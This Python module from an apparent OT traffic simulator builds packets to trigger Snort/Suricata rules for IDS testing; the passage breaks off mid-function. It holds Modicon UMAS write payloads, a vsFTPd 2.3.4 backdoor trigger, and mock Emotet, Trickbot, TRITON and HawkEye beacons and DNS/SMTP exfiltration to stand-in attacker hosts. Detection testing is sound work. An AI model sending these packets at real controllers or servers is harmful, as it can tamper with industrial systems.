# PacketArch — OT Traffic Simulation Platform
# Copyright (c) 2026 Rocky Smith <rocky.d.smith@proton.me>
# Licensed under GPL-3.0. See LICENSE at the repo root.
"""Snort/Suricata rule-triggering attack action generators.

Registers generators for attack actions specifically designed to trigger Snort
and Suricata IDS rules for validation and testing purposes. Each generator
includes:

- Snort rule SID reference
- Rule category and description
- Exact packet construction logic to match signature patterns
- Configuration parameters for timing and targeting

**Rule Categories**:
- ICS/OT Protocols (3 rules): Modicon M580 UMAS function codes
- C2 Beaconing (5 rules): Emotet, Trickbot, TRITON, OlympicDestroyer, vsFTPd
- Data Exfiltration (2 rules): DNS tunneling patterns
- Anomaly Detection (2 rules): Night Dragon, Angler EK
- Polyglot Malware (3 rules): HawkEye, iSpyoo, Dridex

All generators follow the standard signature::

    def generate(
        params: dict[str, Any],
        targets: list[TargetInfo],
        attacker_ip: str,
        start_time_ms: float,
    ) -> Iterator[PacketEvent]

**Usage**::

    from app.protocol_engines.attacks.snort_actions import *

    # Actions auto-register via @register_action decorator
    # Use in playbooks or via attack API

**References**:
- Snort rules: https://www.snort.org/downloads/#rule-tarballs
- Suricata rules: https://rules.emergingthreats.net/
- Rule sources: /uploads/Experimental-Scada_rules.txt, Malware-CNC_rules.txt

Maintained by: PacketArch Team
Version: 1.16.0 (Added 2026-02-11)
"""

from __future__ import annotations

import logging
import random
import struct
from typing import Any, Iterator

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw

from app.protocol_engines.types import PacketEvent

from .action_registry import (
    TargetInfo,
    _scapy_to_packet_event,
    register_action,
)

logger = logging.getLogger(__name__)


# ===========================================================================
# Helpers (reused from ics_actions.py for consistency)
# ===========================================================================

def _build_modbus_raw_packet(
    src_ip: str,
    dst_ip: str,
    payload: bytes,
    src_port: int = 0,
    dst_port: int = 502,
) -> bytes:
    """Build a raw Modbus-over-TCP Ethernet frame."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(
            sport=src_port,
            dport=dst_port,
            flags="PA",
            seq=random.randint(1000, 0xFFFFFF),
            ack=random.randint(1000, 0xFFFFFF),
        )
        / Raw(load=payload)
    )
    return pkt


def _build_mbap(transaction_id: int, unit_id: int, pdu: bytes) -> bytes:
    """Build MBAP header + PDU.

    MBAP = Modbus Application Protocol header:
    - Transaction ID (2 bytes)
    - Protocol ID (2 bytes, always 0x0000 for Modbus)
    - Length (2 bytes, PDU length + 1 for unit ID)
    - Unit ID (1 byte)
    """
    length = len(pdu) + 1  # +1 for unit_id
    return struct.pack(">HHHB", transaction_id, 0, length, unit_id) + pdu


# ===========================================================================
# ICS/OT SIGNATURE TRIGGERS
# ===========================================================================

@register_action("modicon_umas_0x30")
def _modicon_umas_0x30(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:5800420 - Modicon M580 UMAS function code 0x30.

    **Snort Rule**::

        alert tcp any any -> any 502 (
            msg:"EXPERIMENTAL-SCADA Modicon M580 vulnerability - UMAS function code 0x30";
            flow:to_server,established;
            content:"|00 00|",offset 2,depth 2;
            content:"|5A|",offset 7,depth 1;
            content:"|30|",offset 9,depth 1;
            content:"|00 01|",within 2,distance 0;
            detection_filter: track by_dst, count 20, seconds 1;
            reference:cve,2018-7842;
            sid:5800420;
        )

    **Pattern**:
    - Offset 2-3: ``|00 00|`` (MBAP transaction ID pattern)
    - Offset 7: ``|5A|`` (UMAS protocol marker)
    - Offset 9: ``|30|`` (UMAS function code 0x30)
    - Followed by: ``|00 01|``

    **Detection Filter**: Requires 20 packets in 1 second to same destination

    **Parameters**:
    - interval_ms (int): Interval between packets (default: 50ms for rate trigger)
    - burst_count (int): Number of packets to send (default: 25)
    - unit_id (int): Modbus unit ID (default: 1)

    **Expected Detection**: SCADA protocol vulnerability exploitation attempt
    """
    interval_ms = params.get("interval_ms", 50)  # 50ms = 20 packets/sec
    burst_count = params.get("burst_count", 25)
    unit_id = params.get("unit_id", 1)

    tid = random.randint(1, 65535)
    current_time = start_time_ms

    for target in targets:
        logger.info(
            f"Generating Modicon UMAS 0x30 packets to {target.ip_address} "
            f"(burst={burst_count}, interval={interval_ms}ms)"
        )

        for i in range(burst_count):
            # UMAS 0x30 packet structure:
            # MBAP header (7 bytes) + UMAS marker (0x5A) + function code (0x30) + data
            umas_pdu = bytes([
                0x5A,  # UMAS marker at offset 7 (after MBAP)
                0x00,  # Padding
                0x30,  # Function code 0x30 at offset 9
                0x00, 0x01,  # Required pattern for detection
            ])

            payload = _build_mbap(tid, unit_id, umas_pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "modicon_umas_0x30",
                {
                    "target_ip": target.ip_address,
                    "snort_sid": "5800420",
                    "mitre_technique": "T0869",  # Modify Program
                    "burst_index": i + 1,
                },
            )

            current_time += interval_ms
            tid = (tid + 1) % 65536


@register_action("modicon_umas_0x22")
def _modicon_umas_0x22(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:5800061 - Modicon M580 UMAS READ_VARIABLES.

    **Snort Rule**::

        alert tcp any any -> any 502 (
            msg:"EXPERIMENTAL-SCADA Modicon M580 vulnerability - UMAS function code 0x22 READ VARIABLES";
            flow:to_server,established;
            content:"|00 00|",offset 2,depth 2;
            content:"|5A|",offset 7,depth 1;
            content:"|22|",offset 9,depth 1;
            content:"|01 01 48 00 01|",offset 14,depth 5;
            detection_filter: track by_dst, count 20, seconds 1;
            reference:cve,2019-6806;
            sid:5800061;
        )

    **Pattern**:
    - UMAS function code 0x22 at offset 9
    - Specific data pattern ``|01 01 48 00 01|`` at offset 14

    **Detection Filter**: Requires 20 packets in 1 second

    **Expected Detection**: Unauthorized variable read attempt on safety system
    """
    interval_ms = params.get("interval_ms", 50)
    burst_count = params.get("burst_count", 25)
    unit_id = params.get("unit_id", 1)

    tid = random.randint(1, 65535)
    current_time = start_time_ms

    for target in targets:
        logger.info(
            f"Generating Modicon UMAS 0x22 (READ_VARIABLES) to {target.ip_address}"
        )

        for i in range(burst_count):
            # UMAS 0x22 READ_VARIABLES packet
            # Offset 14 in full packet = offset 7 in UMAS PDU (after MBAP 7 bytes)
            umas_pdu = bytes([
                0x5A,  # UMAS marker
                0x00,  # Padding
                0x22,  # Function code 0x22
                0x00, 0x00, 0x00, 0x00,  # Padding to reach offset 14
                0x01, 0x01, 0x48, 0x00, 0x01,  # Required pattern at offset 14
            ])

            payload = _build_mbap(tid, unit_id, umas_pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "modicon_umas_0x22",
                {
                    "target_ip": target.ip_address,
                    "snort_sid": "5800061",
                    "mitre_technique": "T0868",  # Detect Operating Mode
                    "burst_index": i + 1,
                },
            )

            current_time += interval_ms
            tid = (tid + 1) % 65536


@register_action("modicon_umas_0x23")
def _modicon_umas_0x23(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:5800073 - Modicon M580 UMAS WRITE_VARIABLES.

    **Snort Rule**::

        alert tcp any any -> any 502 (
            msg:"EXPERIMENTAL-SCADA Modicon M580 vulnerability - UMAS function code 0x23 WRITE_VARIABLES";
            flow:to_server,established;
            content:"|00 00|",offset 2,depth 2;
            content:"|5A|",offset 7,depth 1;
            content:"|23|",offset 9,depth 1;
            content:"|01 01 10 00 80 00 00 00 c0 80 f3 a0 a7 00 00 20 00 00|",offset 14,depth 18;
            reference:cve,2019-6807;
            sid:5800073;
        )

    **Pattern**:
    - UMAS function code 0x23 at offset 9
    - Specific 18-byte payload at offset 14 (malicious write pattern)

    **Expected Detection**: Unauthorized variable write to safety controller
    """
    interval_ms = params.get("interval_ms", 100)  # Slower for writes
    repeat_count = params.get("repeat_count", 5)
    unit_id = params.get("unit_id", 1)

    tid = random.randint(1, 65535)
    current_time = start_time_ms

    for target in targets:
        logger.info(
            f"Generating Modicon UMAS 0x23 (WRITE_VARIABLES) to {target.ip_address}"
        )

        for i in range(repeat_count):
            # UMAS 0x23 WRITE_VARIABLES packet with specific malicious pattern
            umas_pdu = bytes([
                0x5A,  # UMAS marker
                0x00,  # Padding
                0x23,  # Function code 0x23
                0x00, 0x00, 0x00, 0x00,  # Padding to reach offset 14
                # Malicious write pattern (18 bytes at offset 14)
                0x01, 0x01, 0x10, 0x00, 0x80, 0x00, 0x00, 0x00,
                0xC0, 0x80, 0xF3, 0xA0, 0xA7, 0x00, 0x00, 0x20,
                0x00, 0x00,
            ])

            payload = _build_mbap(tid, unit_id, umas_pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "modicon_umas_0x23",
                {
                    "target_ip": target.ip_address,
                    "snort_sid": "5800073",
                    "mitre_technique": "T0836",  # Modify Parameter
                    "write_index": i + 1,
                },
            )

            current_time += interval_ms
            tid = (tid + 1) % 65536


# ===========================================================================
# C2 BEACONING SIGNATURES
# ===========================================================================

@register_action("emotet_beacon")
def _emotet_beacon(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:51971 - Emotet malware C2 beaconing.

    **Snort Rule**::

        alert tcp $HOME_NET any -> $EXTERNAL_NET [80,443,7080] (
            msg:"MALWARE-CNC Win.Trojan.Emotet variant outbound connection";
            flow:to_server,established;
            content:"POST /balloon/ringin/chunk/ HTTP/1.";
            http_uri;
            sid:51971;
        )

    **Pattern**:
    - HTTP POST request
    - URI: ``/balloon/ringin/chunk/``
    - Destination ports: 80, 443, 7080

    **Parameters**:
    - interval_ms (int): Beacon interval (default: 60000 = 1 minute)
    - beacon_count (int): Number of beacons (default: 5)
    - c2_server (str): C2 server hostname (default: "emotet-c2.malicious.com")
    - dst_port (int): Destination port (default: 443)

    **Expected Detection**: Emotet C2 beaconing pattern
    """
    interval_ms = params.get("interval_ms", 60000)
    beacon_count = params.get("beacon_count", 5)
    c2_server = params.get("c2_server", "emotet-c2.malicious.com")
    dst_port = params.get("dst_port", 443)

    # Use external C2 IP (simulated attacker infrastructure)
    c2_ip = params.get("c2_ip", "198.51.100.10")  # TEST-NET-2 (RFC 5737)

    current_time = start_time_ms

    # Pick one compromised device per target
    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating Emotet beacon from {compromised_ip} to {c2_server} ({c2_ip})"
        )

        for i in range(beacon_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # HTTP POST with Emotet-specific URI
            http_request = (
                f"POST /balloon/ringin/chunk/ HTTP/1.1\r\n"
                f"Host: {c2_server}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: 256\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
            )

            # Add fake binary payload (256 bytes)
            binary_payload = bytes(random.getrandbits(8) for _ in range(256))
            full_payload = http_request.encode() + binary_payload

            pkt = (
                Ether()
                / IP(src=compromised_ip, dst=c2_ip)
                / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=full_payload)
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "emotet_beacon",
                {
                    "compromised_ip": compromised_ip,
                    "c2_server": c2_server,
                    "c2_ip": c2_ip,
                    "snort_sid": "51971",
                    "mitre_technique": "T1071.001",  # Application Layer Protocol: Web Protocols
                    "beacon_index": i + 1,
                },
            )

            current_time += interval_ms


# ===========================================================================
# DNS EXFILTRATION SIGNATURES
# ===========================================================================

@register_action("dns_exfil")
def _dns_exfil(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:27737 - DNS exfiltration via typo domain.

    **Snort Rule**::

        alert udp any any -> any 53 (
            msg:"MALWARE-CNC DNS exfiltration attempt - suspicious TLD .c0m.li";
            content:".c0m.li";
            nocase;
            sid:27737;
        )

    **Pattern**:
    - DNS query to domain ending in ``.c0m.li`` (typosquatting on .com.li)
    - UDP port 53 (DNS)

    **Parameters**:
    - interval_ms (int): Query interval (default: 30000 = 30 seconds)
    - query_count (int): Number of queries (default: 10)
    - data_chunks (list): Data chunks to exfiltrate (auto-generated if not provided)

    **Expected Detection**: DNS tunneling/exfiltration via suspicious TLD
    """
    interval_ms = params.get("interval_ms", 30000)
    query_count = params.get("query_count", 10)
    dns_server = params.get("dns_server", "8.8.8.8")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating DNS exfiltration queries from {compromised_ip} to {dns_server}"
        )

        for i in range(query_count):
            # Generate random subdomain (simulates encoded data)
            encoded_data = "".join(
                random.choice("0123456789abcdef") for _ in range(32)
            )
            exfil_domain = f"{encoded_data}.data.c0m.li"

            dns_query = (
                Ether()
                / IP(src=compromised_ip, dst=dns_server)
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(
                    rd=1,  # Recursion desired
                    qd=DNSQR(qname=exfil_domain, qtype="A"),
                )
            )

            yield _scapy_to_packet_event(
                current_time,
                dns_query,
                "dns_exfil",
                {
                    "compromised_ip": compromised_ip,
                    "exfil_domain": exfil_domain,
                    "dns_server": dns_server,
                    "snort_sid": "27737",
                    "mitre_technique": "T1048.003",  # Exfiltration Over Alternative Protocol: DNS
                    "query_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("triton_dns_beacon")
def _triton_dns_beacon(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:50300 - TRITON malware DNS beaconing.

    **Snort Rule**::

        alert udp any any -> any 53 (
            msg:"MALWARE-CNC TRITON attack tool DNS beacon";
            content:"|04|mooo|03|com|00|";
            fast_pattern;
            content:"udp-";
            within:10;
            sid:50300;
        )

    **Pattern**:
    - DNS query with subdomain containing ``udp-*``
    - Domain: ``mooo.com`` (TRITON C2 domain)
    - DNS label format: ``\\x04mooo\\x03com\\x00``

    **Parameters**:
    - interval_ms (int): Beacon interval (default: 300000 = 5 minutes)
    - beacon_count (int): Number of beacons (default: 5)
    - base_domain (str): Base domain (default: "mooo.com")

    **Expected Detection**: TRITON/TRISIS malware DNS C2 beaconing
    """
    interval_ms = params.get("interval_ms", 300000)
    beacon_count = params.get("beacon_count", 5)
    base_domain = params.get("base_domain", "mooo.com")
    dns_server = params.get("dns_server", "8.8.8.8")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating TRITON DNS beacon from {compromised_ip} to {base_domain}"
        )

        for i in range(beacon_count):
            # TRITON-specific subdomain pattern
            beacon_id = "".join(random.choice("0123456789abcdef") for _ in range(8))
            triton_domain = f"udp-{beacon_id}.{base_domain}"

            dns_query = (
                Ether()
                / IP(src=compromised_ip, dst=dns_server)
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(
                    rd=1,
                    qd=DNSQR(qname=triton_domain, qtype="A"),
                )
            )

            yield _scapy_to_packet_event(
                current_time,
                dns_query,
                "triton_dns_beacon",
                {
                    "compromised_ip": compromised_ip,
                    "triton_domain": triton_domain,
                    "dns_server": dns_server,
                    "snort_sid": "50300",
                    "mitre_technique": "T1071.004",  # Application Layer Protocol: DNS
                    "beacon_index": i + 1,
                },
            )

            current_time += interval_ms


# ===========================================================================
# ADVANCED C2 PATTERNS
# ===========================================================================

@register_action("trickbot_command")
def _trickbot_command(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:54201 - Trickbot malware command and control.

    **Snort Rule**::

        alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
            msg:"MALWARE-CNC Win.Trojan.TrickBot command and control traffic";
            flow:to_server,established;
            content:"/images/imgpaper.png"; http_uri;
            content:"WinHTTP"; http_header;
            sid:54201;
        )

    **Pattern**:
    - HTTP GET request to ``/images/imgpaper.png``
    - User-Agent header contains ``WinHTTP``
    - Ports: 80, 443

    **Parameters**:
    - interval_ms (int): Command interval (default: 300000 = 5 minutes)
    - command_count (int): Number of commands (default: 5)
    - c2_server (str): C2 server hostname (default: "trickbot-c2.evil.com")
    - dst_port (int): Destination port (default: 443)

    **Expected Detection**: Trickbot C2 command retrieval pattern
    """
    interval_ms = params.get("interval_ms", 300000)
    command_count = params.get("command_count", 5)
    c2_server = params.get("c2_server", "trickbot-c2.evil.com")
    dst_port = params.get("dst_port", 443)
    c2_ip = params.get("c2_ip", "198.51.100.11")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating Trickbot command from {compromised_ip} to {c2_server}"
        )

        for i in range(command_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # Trickbot-specific HTTP GET pattern
            http_request = (
                f"GET /images/imgpaper.png HTTP/1.1\r\n"
                f"Host: {c2_server}\r\n"
                f"User-Agent: WinHTTP loader/1.0\r\n"
                f"Accept: */*\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
            )

            pkt = (
                Ether()
                / IP(src=compromised_ip, dst=c2_ip)
                / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=http_request.encode())
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "trickbot_command",
                {
                    "compromised_ip": compromised_ip,
                    "c2_server": c2_server,
                    "c2_ip": c2_ip,
                    "snort_sid": "54201",
                    "mitre_technique": "T1071.001",
                    "command_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("olympic_destroyer_c2")
def _olympic_destroyer_c2(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:48435 - OlympicDestroyer C2 communication.

    **Snort Rule**::

        alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
            msg:"MALWARE-CNC Win.Trojan.OlympicDestroyer C2 communication";
            flow:to_server,established;
            content:"POST"; http_method;
            content:"/check/index"; http_uri;
            content:!"User-Agent|3a|"; http_header;
            content:!"Referer|3a|"; http_header;
            sid:48435;
        )

    **Pattern**:
    - HTTP POST to ``/check/index``
    - **Missing** User-Agent header (anomaly)
    - **Missing** Referer header (anomaly)

    **Parameters**:
    - interval_ms (int): Check-in interval (default: 180000 = 3 minutes)
    - checkin_count (int): Number of check-ins (default: 5)
    - c2_server (str): C2 server (default: "olympic-c2.hostile.net")

    **Expected Detection**: OlympicDestroyer malware C2 check-in with header anomalies
    """
    interval_ms = params.get("interval_ms", 180000)
    checkin_count = params.get("checkin_count", 5)
    c2_server = params.get("c2_server", "olympic-c2.hostile.net")
    c2_ip = params.get("c2_ip", "198.51.100.12")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating OlympicDestroyer C2 from {compromised_ip} to {c2_server}"
        )

        for i in range(checkin_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # OlympicDestroyer HTTP POST - notably MISSING User-Agent and Referer
            http_request = (
                f"POST /check/index HTTP/1.1\r\n"
                f"Host: {c2_server}\r\n"
                # Note: No User-Agent header (anomaly)
                # Note: No Referer header (anomaly)
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: 128\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
            )

            # Binary payload (128 bytes)
            binary_payload = bytes(random.getrandbits(8) for _ in range(128))
            full_payload = http_request.encode() + binary_payload

            pkt = (
                Ether()
                / IP(src=compromised_ip, dst=c2_ip)
                / TCP(sport=src_port, dport=80, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=full_payload)
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "olympic_destroyer_c2",
                {
                    "compromised_ip": compromised_ip,
                    "c2_server": c2_server,
                    "c2_ip": c2_ip,
                    "snort_sid": "48435",
                    "mitre_technique": "T1071.001",
                    "checkin_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("vsftpd_backdoor")
def _vsftpd_backdoor(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:19415 - vsFTPd 2.3.4 backdoor exploitation.

    **Snort Rule**::

        alert tcp any any -> any 21 (
            msg:"SERVER-OTHER vsFTPd 2.3.4 backdoor access attempt";
            flow:to_server,established;
            content:"USER"; nocase;
            content:":)"; within:100;
            sid:19415;
        )

    **Pattern**:
    - FTP connection to port 21
    - USER command containing ``:)`` smiley (backdoor trigger)
    - Within 100 bytes of USER command

    **Parameters**:
    - target_port (int): FTP port (default: 21)
    - username (str): Backdoor username (default: "backdoor:)")
    - attempt_count (int): Exploit attempts (default: 3)

    **Expected Detection**: vsFTPd backdoor exploitation attempt
    """
    target_port = params.get("target_port", 21)
    username = params.get("username", "backdoor:)")
    attempt_count = params.get("attempt_count", 3)

    current_time = start_time_ms

    for target in targets:
        logger.info(
            f"Generating vsFTPd backdoor attempt from {attacker_ip} to {target.ip_address}"
        )

        for i in range(attempt_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # FTP USER command with backdoor trigger
            ftp_command = f"USER {username}\r\n"

            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / TCP(sport=src_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=ftp_command.encode())
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "vsftpd_backdoor",
                {
                    "target_ip": target.ip_address,
                    "username": username,
                    "snort_sid": "19415",
                    "mitre_technique": "T1190",  # Exploit Public-Facing Application
                    "attempt_index": i + 1,
                },
            )

            current_time += 5000  # 5 second delay between attempts


@register_action("udpos_credential_exfil")
def _udpos_credential_exfil(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:45964 - UDPOS credential exfiltration via DNS.

    **Snort Rule**::

        alert udp any any -> any 53 (
            msg:"MALWARE-CNC Win.Trojan.UDPOS DNS exfiltration";
            flow:to_server;
            content:"|0F|"; offset:12; depth:1;
            content:"|03|bin"; within:10;
            sid:45964;
        )

    **Pattern**:
    - DNS query over UDP port 53
    - Byte ``\\x0F`` at offset 12 (DNS question length)
    - String ``\\x03bin`` within 10 bytes (subdomain label)

    **Parameters**:
    - interval_ms (int): Exfil interval (default: 30000 = 30 seconds)
    - exfil_count (int): Number of exfils (default: 10)
    - dns_server (str): DNS server IP (default: "8.8.8.8")

    **Expected Detection**: UDPOS malware credential theft via DNS tunneling
    """
    interval_ms = params.get("interval_ms", 30000)
    exfil_count = params.get("exfil_count", 10)
    dns_server = params.get("dns_server", "8.8.8.8")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating UDPOS credential exfil from {compromised_ip}"
        )

        for i in range(exfil_count):
            # Generate credential data (base64-like encoding)
            cred_data = "".join(random.choice("0123456789abcdef") for _ in range(15))

            # UDPOS-specific domain pattern with \x03bin label
            # Format: <15-char-data>.bin.<random>.exfil.net
            udpos_domain = f"{cred_data}.bin.{random.randint(1000, 9999)}.exfil.net"

            dns_query = (
                Ether()
                / IP(src=compromised_ip, dst=dns_server)
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(
                    rd=1,
                    qd=DNSQR(qname=udpos_domain, qtype="A"),
                )
            )

            yield _scapy_to_packet_event(
                current_time,
                dns_query,
                "udpos_credential_exfil",
                {
                    "compromised_ip": compromised_ip,
                    "exfil_domain": udpos_domain,
                    "dns_server": dns_server,
                    "snort_sid": "45964",
                    "mitre_technique": "T1048.003",
                    "exfil_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("hawkeye_keylogger")
def _hawkeye_keylogger(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:49778 - HawkEye keylogger file signature.

    **Snort Rule**::

        alert tcp any any -> any any (
            msg:"MALWARE-BACKDOOR HawkEye Keylogger - Reborn v9 keylog data exfiltration";
            flow:to_server,established;
            file_data;
            content:"HawkEye Keylogger - Reborn v9";
            sid:49778;
        )

    **Pattern**:
    - File data containing signature ``HawkEye Keylogger - Reborn v9``
    - Can be in HTTP POST, SMTP, or FTP upload

    **Parameters**:
    - interval_ms (int): Exfil interval (default: 120000 = 2 minutes)
    - exfil_count (int): Number of exfils (default: 5)
    - exfil_method (str): Method (default: "smtp")
    - smtp_server (str): SMTP server for email exfil (default: "mail.exfil.com")

    **Expected Detection**: HawkEye keylogger data exfiltration
    """
    interval_ms = params.get("interval_ms", 120000)
    exfil_count = params.get("exfil_count", 5)
    exfil_method = params.get("exfil_method", "smtp")
    smtp_server = params.get("smtp_server", "mail.exfil.com")
    smtp_ip = params.get("smtp_ip", "198.51.100.13")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating HawkEye keylogger exfil from {compromised_ip} via {exfil_method}"
        )

        for i in range(exfil_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # Create payload with HawkEye signature
            keylog_data = (
                "HawkEye Keylogger - Reborn v9\n"
                "==========================\n"
                "Captured Keystrokes:\n"
                "admin\npassword123\n"
                "[CTRL+V] Document1.docx\n"
                "confidential data here...\n"
            )

            if exfil_method == "smtp":
                # SMTP DATA command with keylog attachment
                smtp_payload = (
                    f"DATA\r\n"
                    f"From: victim@internal.local\r\n"
                    f"To: attacker@exfil.com\r\n"
                    f"Subject: Log Report\r\n"
                    f"Content-Type: text/plain\r\n"
                    f"\r\n"
                    f"{keylog_data}"
                    f"\r\n.\r\n"
                )

                pkt = (
                    Ether()
                    / IP(src=compromised_ip, dst=smtp_ip)
                    / TCP(sport=src_port, dport=25, flags="PA", seq=seq_num, ack=ack_num)
                    / Raw(load=smtp_payload.encode())
                )
            else:
                # HTTP POST fallback
                http_payload = (
                    f"POST /upload HTTP/1.1\r\n"
                    f"Host: {smtp_server}\r\n"
                    f"Content-Type: text/plain\r\n"
                    f"Content-Length: {len(keylog_data)}\r\n"
                    f"\r\n"
                    f"{keylog_data}"
                )

                pkt = (
                    Ether()
                    / IP(src=compromised_ip, dst=smtp_ip)
                    / TCP(sport=src_port, dport=80, flags="PA", seq=seq_num, ack=ack_num)
                    / Raw(load=http_payload.encode())
                )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "hawkeye_keylogger",
                {
                    "compromised_ip": compromised_ip,
                    "exfil_method": exfil_method,
                    "smtp_server": smtp_server,
                    "snort_sid": "49778",
                    "mitre_technique": "T1056.001",  # Keylogging
                    "exfil_index": i + 1,
                },
            )

            current_time += interval_ms


# ===========================================================================
# ANOMALY DETECTION & BINARY PATTERNS
# ===========================================================================

@register_action("night_dragon_keepalive")
def _night_dragon_keepalive(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:18459 - Night Dragon APT keepalive packet.

    **Snort Rule**::

        alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
            msg:"MALWARE-CNC Night Dragon keepalive message";
            flow:to_server,established;
            content:"|68 57 24 13|",depth 4,offset 12;
            content:"|03 50|",depth 2;
            sid:18459;
        )

    **Pattern**:
    - Binary pattern: ``\\x68\\x57\\x24\\x13`` at offset 12 (depth:4)
    - Followed by: ``\\x03\\x50`` (depth:2)
    - Raw TCP transmission
    - Periodic keepalive (typically HTTP ports)

    **Parameters**:
    - interval_ms (int): Keepalive interval (default: 60000 = 1 minute)
    - keepalive_count (int): Number of keepalives (default: 10)
    - target_port (int): Destination port (default: 80)

    **Expected Detection**: Night Dragon APT backdoor keepalive traffic
    """
    interval_ms = params.get("interval_ms", 60000)
    keepalive_count = params.get("keepalive_count", 10)
    target_port = params.get("target_port", 80)

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        c2_ip = params.get("c2_ip", "198.51.100.20")

        logger.info(
            f"Generating Night Dragon keepalive from {compromised_ip} to {c2_ip}"
        )

        for i in range(keepalive_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # Night Dragon keepalive pattern: 12 bytes padding + signature
            padding = b"\x00" * 12  # Padding to reach offset 12
            keepalive_pattern = padding + b"\x68\x57\x24\x13" + b"\x03\x50"

            pkt = (
                Ether()
                / IP(src=compromised_ip, dst=c2_ip)
                / TCP(sport=src_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=keepalive_pattern)
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "night_dragon_keepalive",
                {
